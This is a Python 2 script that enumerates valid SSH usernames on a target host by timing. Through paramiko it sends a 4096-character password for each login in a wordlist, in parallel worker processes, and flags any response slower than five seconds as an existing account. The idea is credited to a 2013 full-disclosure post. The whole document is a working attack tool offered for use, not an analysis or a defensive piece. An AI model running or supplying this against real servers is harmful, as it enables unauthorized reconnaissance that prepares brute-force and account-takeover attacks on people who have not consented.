#!/usr/bin/python

from multiprocessing import Queue, Pool, active_children
from optparse import OptionParser
from time import sleep, time

import paramiko
import sys


target = ""
port = 22
poolsz = 10
#If user request single username
uname = ""
files = []

queue = Queue()

def usage():
    print """
    Time based user enumerator. Idea from 
    http://seclists.org/fulldisclosure/2013/Jul/88
    
    Usage:
    
    %s -t target [-p port] logins_file

    Where:
    target is target IP or domain name
    logins_file is file with list of logins 
    delimited by newline character
    """ % sys.argv[0]

class enumerator():
    def __init__(self):
        global target, port
        self.target = target
        self.port = port
        self.password = "A" * 4096
    def check_user(self, uname):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        start = time()
        try:
            ssh.connect(self.target, username=uname, port=self.port, password=self.password)
        except paramiko.AuthenticationException:
            pass

        stop = time()
        diff = stop - start
        if diff > 5: #magic number 5
            queue.put(uname)
        ssh.close()       
        print diff, uname

def parse_options():
    global uname, target, port, files
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target")
    parser.add_option("-p", "--port", dest="port")
    parser.add_option("-u", "--user", dest="user")
    parser.print_help = usage
    (o, a) = parser.parse_args()

    if o.target is None:
        usage()
        exit(1)
    if o.user is not None:
        uname = o.user
    if o.target is not None:
        target = o.target
    if o.port is not None:
        port = int(o.port)
    files = a

def worker(logins):
    print "worker", logins
    e = enumerator()

    for item in logins:
        e.check_user(item)
    return

def get_next_lines(fp, n):
    ret = []
    for i in range(n):
        line = fp.readline()
        if line is None or line == "":
            break
        ret.append(line.rstrip('\n').rstrip('\r'))
    return ret

def split_file_to_chunks(fp, nchunks):
    total = 0
    while len(fp.readline()) > 0:
        total += 1
    fp.seek(0)
    chunk_size = total / nchunks + 1
    print chunk_size
    while True:
        ret = get_next_lines(fp, chunk_size)
        if len(ret) == 0:
            break
        yield ret
            

def main(argc, argv):
    global host, port
    if (argc < 2):
        usage()
        exit(1)
    parse_options()

    if uname is not None:
        enumerator().check_user(uname)
    
    for item in files:
        fp = open(item, "r")
        login_chunks = split_file_to_chunks(fp, poolsz)
        p = Pool(processes=poolsz);
        p.map_async(worker, login_chunks)
        p.close()
        while (len(active_children()) > 0):
            sleep(2)

    while not queue.empty():
        print queue.get()

if __name__ == '__main__':
    main(len(sys.argv), sys.argv[:])
